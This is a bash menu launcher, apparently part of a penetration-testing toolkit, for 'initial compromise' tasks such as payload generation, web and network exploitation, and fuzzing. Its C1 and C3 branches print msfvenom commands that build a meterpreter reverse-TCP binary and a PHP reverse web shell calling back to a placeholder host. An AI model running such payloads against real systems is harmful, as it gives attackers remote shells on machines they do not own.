#!/bin/bash

#############################################################################
#                                                                           #
#  INITIAL COMPROMISE SUITE                                                 #
#  Phase 3: Exploit vulnerabilities to gain initial access                   #
#                                                                           #
#  Includes:                                                               #
#  - Web application exploitation                                            #
#  - Network exploitation                                                  #
#  - Binary exploitation                                                   #
#  - Social engineering                                                   #
#                                                                           #
#############################################################################

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║              INITIAL COMPROMISE SUITE                                     ║
║              Phase 3: Exploit vulnerabilities to gain access               ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

show_menu() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  INITIAL COMPROMISE${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Payload Generation${NC}"
    echo "   C1.  Payload Generator (msfvenom)"
    echo "   C2.  Reverse Shell Generator"
    echo "   C3.  Web Shell Generator"
    echo "   C4.  Encoding & Obfuscation"
    echo ""
    echo -e "${YELLOW}Web Application Exploitation${NC}"
    echo "   CW1. Web Exploitation Toolkit"
    echo "   CW2. SQL Injection Testing"
    echo "   CW3. Command Injection Testing"
    echo "   CW4. File Upload Exploitation"
    echo "   CW5. LFI/RFI Testing"
    echo ""
    echo -e "${YELLOW}Network Exploitation${NC}"
    echo "   CN1. Exploit Scripts"
    echo "   CN2. Metasploit Integration"
    echo ""
    echo -e "${YELLOW}Binary Exploitation${NC}"
    echo "   CB1. ELF Binary Analyzer"
    echo "   CB2. Fuzzer"
    echo ""
    echo -e "${RED}0. Exit to Main Menu${NC}"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_good() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }

usage() {
    cat << EOF
USAGE: $0 [OPTIONS]

OPTIONS:
    C1                      Payload generator (msfvenom)
    C2                      Reverse shell generator
    CW1                     Web exploitation toolkit
    CN1                     Network exploit scripts
    CB1                     ELF binary analyzer
    --menu                  Show interactive menu
    --help                  Show this help

EXAMPLES:
    $0 C1
    $0 CW1
    $0 --menu

EOF
}

handle_selection() {
    local choice="$1"
    shift
    
    case "$choice" in
        C1|c1)
            log_info "Payload Generator"
            echo "Launching msfvenom payload generator..."
            if [[ -x "$SCRIPT_DIR/payloads.sh" ]]; then
                "$SCRIPT_DIR/payloads.sh"
            else
                echo "msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f elf"
            fi
            ;;
        C2|c2)
            log_info "Reverse Shell Generator"
            echo "Launching reverse shell generator..."
            if [[ -x "$SCRIPT_DIR/shells.sh" ]]; then
                "$SCRIPT_DIR/shells.sh"
            fi
            ;;
        C3|c3)
            log_info "Web Shell Generator"
            echo "Generating web shells..."
            echo "msfvenom -p php/reverse_php LHOST=<IP> LPORT=443 -f raw > shell.php"
            ;;
        C4|c4)
            log_info "Encoding & Obfuscation"
            echo "Launching encoding toolkit..."
            if [[ -x "$SCRIPT_DIR/encoder.sh" ]]; then
                "$SCRIPT_DIR/encoder.sh"
            fi
            ;;
        CW1|cw1)
            log_info "Web Exploitation Toolkit"
            echo "Launching web exploitation tools..."
            if [[ -x "$SCRIPT_DIR/web-exploit.sh" ]]; then
                "$SCRIPT_DIR/web-exploit.sh"
            else
                echo "Tools: sqlmap, burp, gobuster, nikto"
            fi
            ;;
        CN1|cn1)
            log_info "Network Exploitation"
            echo "Available exploit scripts:"
            ls "$SCRIPT_DIR/"*.sh 2>/dev/null | while read -r script; do
                echo "  $(basename "$script")"
            done
            ;;
        CB1|cb1)
            log_info "ELF Binary Analyzer"
            echo "Launching binary analysis tools..."
            ;;
        --menu)
            banner
            show_menu
            read -p "Enter choice: " choice
            handle_selection "$choice"
            ;;
        --help|-h)
            usage
            ;;
        *)
            log_warn "Invalid choice: $choice"
            usage
            ;;
    esac
}

main() {
    if [[ $# -gt 0 ]]; then
        handle_selection "$@"
        exit 0
    fi
    
    while true; do
        banner
        show_menu
        
        echo ""
        read -p "Enter choice: " choice
        
        if [[ "$choice" == "0" ]]; then
            echo -e "${GREEN}Returning to main menu...${NC}"
            exit 0
        fi
        
        handle_selection "$choice"
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"
